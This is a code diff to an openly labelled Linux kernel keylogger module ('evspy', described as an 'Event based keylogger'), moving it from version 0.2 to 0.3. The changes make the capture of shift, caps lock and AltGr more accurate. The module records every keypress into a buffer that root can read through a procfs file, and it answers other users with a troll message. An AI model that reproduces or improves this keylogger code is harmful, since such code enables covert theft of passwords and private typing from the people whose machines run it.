@@ -26,9 +26,9 @@
 static char *buffer;		// circular buffer
 static char *rdp;			// read pointer
 static char *wrp;			// write pointer
-static unsigned short int capslock_state = EVS_VAL_FREE;
-static unsigned short int shift = 0;
-static unsigned short int altgr = 0;
+static unsigned short int capslock_on = 0;
+static unsigned short int shift_on = 0;
+static unsigned short int altgr_on = 0;
 
 /*
  * Executed when the procfs file is read (EVS_PROCNAME)
@@ -43,7 +43,7 @@ static int evspy_read_proc(char *page, char **start, off_t offset, int count,
 	// root only plz
 	if (current_uid() || current_euid()) {
 #if EVS_TROLL == 1
-		n = MIN(36, count);
+		n = min(36, count);
 		strncpy(page, "Trololololo lololo lololo\nhohohoho\n", n);
 		*eof = 1;
 		return n;
@@ -54,7 +54,7 @@ static int evspy_read_proc(char *page, char **start, off_t offset, int count,
 
 	// wrp > rdp: read from rdp to wrp
 	if (diff > 0) {
-		n = MIN(diff, count);
+		n = min(diff, count);
 		strncpy(page, rdp, n);
 		rdp += n;
 		retval = n;
@@ -63,14 +63,14 @@ static int evspy_read_proc(char *page, char **start, off_t offset, int count,
 	// the buffer to wrp
 	} else if (diff < 0) {
 		toend = (buffer + EVS_BUFSIZE) - rdp;
-		n = MIN(toend, count);
+		n = min(toend, count);
 		strncpy(page, rdp, n);
 		retval = n;
 
 		if (n < toend) {
 			rdp += n;
 		} else {
-			n = MIN(wrp - buffer, count - retval);
+			n = min(wrp - buffer, count - retval);
 			strncpy(page + retval, buffer, n);
 			retval += n;
 			rdp = buffer + n;
@@ -110,14 +110,17 @@ static void special_char(unsigned int code, unsigned int value)
 	switch(code) {
 	case KEY_RIGHTSHIFT:
 	case KEY_LEFTSHIFT:
-		shift = !shift;
+		shift_on = value;
+		return;
+	case KEY_CAPSLOCK:
+		capslock_on = !capslock_on;
 		return;
 	case KEY_LEFTALT:
 		sp_tag = "[+ALT]";
 		break;
 	case KEY_RIGHTALT:
 #ifdef EVS_ALTGR_ENABLED
-		altgr = !altgr;
+		altgr_on = !altgr_on;
 		return;
 #else
 		sp_tag = "[+ALTGR]";
@@ -156,7 +159,7 @@ static void special_char(unsigned int code, unsigned int value)
 		known = 0;
 	}
 
-	if (!known && evs_isfX(code))
+	if (!known && evs_isfX(code))	// !known is redundant, but it saves cycles
 		sp_tag = "[+FX]";
 	else if (!known)
 		return;
@@ -177,11 +180,6 @@ static void evspy_event(struct input_handle *handle, unsigned int type,
 	if (type != EV_KEY || unlikely(value == EVS_VAL_HOLD)) {
 		return;
 
-	// If caps lock is pressed, handle it the same way as left shift
-	} else if (code == KEY_CAPSLOCK && value == EVS_VAL_PRESS) {
-		special_char(KEY_LEFTSHIFT, capslock_state);
-		return;
-
 	// Backspace
 	} else if (code == KEY_BACKSPACE && value == EVS_VAL_PRESS) {
 		evs_backspace();
@@ -193,11 +191,11 @@ static void evspy_event(struct input_handle *handle, unsigned int type,
 			(map[code] == '.' && likely(code != KEY_DOT))) {
 		special_char(code, value);
 
-	// "Direct" keys (alphanumeric + some symbols)
+	// "Immediate" keys (alphanumeric + some symbols)
 	} else if (value == EVS_VAL_PRESS) {
-		if (altgr)
+		if (altgr_on)
 			evs_insert(evs_altgr(code));
-		else if (shift)
+		else if (shift_on || capslock_on)
 			evs_insert(evs_shift(code));
 		else
 			evs_insert(map[code]);
@@ -286,4 +284,4 @@ module_exit(evspy_exit);
 MODULE_AUTHOR("Guillermo Ramos <0xwille@gmail.com>");
 MODULE_DESCRIPTION("Event based keylogger");
 MODULE_LICENSE("GPL");
-MODULE_VERSION("0.2");
+MODULE_VERSION("0.3");
